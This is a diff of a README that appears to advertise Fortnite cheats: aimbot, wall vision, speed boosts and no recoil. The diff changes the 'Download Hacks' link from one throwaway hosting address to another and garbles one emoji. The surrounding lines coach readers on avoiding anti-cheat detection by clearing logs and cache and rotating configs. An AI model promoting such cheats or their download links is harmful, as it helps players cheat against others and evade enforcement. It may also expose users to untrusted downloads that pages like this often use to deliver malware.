@@ -2,7 +2,7 @@
 
 **Cranking 90s too slow? Tired of sweats building the Eiffel Tower mid-fight? Fortnite hacks give you full control: from *perfect aim* and *wall vision* to *speed boosts*, *no recoil*, and more. Whether you're pushing for crowns or just trolling for fun, these cheats flip the script.**
 
-[![Download Hacks](https://img.shields.io/badge/Download-Hacks-blueviolet)](https://fileoffload20.bitbucket.io)
+[![Download Hacks](https://img.shields.io/badge/Download-Hacks-blueviolet)](https://Fortnite-Hacks-pof.github.io/.github)
 ---
 
 ## 🚀 What Are Fortnite Hacks?
@@ -83,7 +83,7 @@ They’re built for:
 * ✅ Use **low FOV + smooth aimbot** for legit vibes
 * ❌ Don’t rage cheat in high-pop areas (spectators clip fast)
 * 🔒 Stick to **private/paid loaders**, avoid sketchy free builds
-* 🧼 Clear logs & cache between games
+* ���� Clear logs & cache between games
 * 🔁 Change configs often to avoid detection patterns
 
 ---
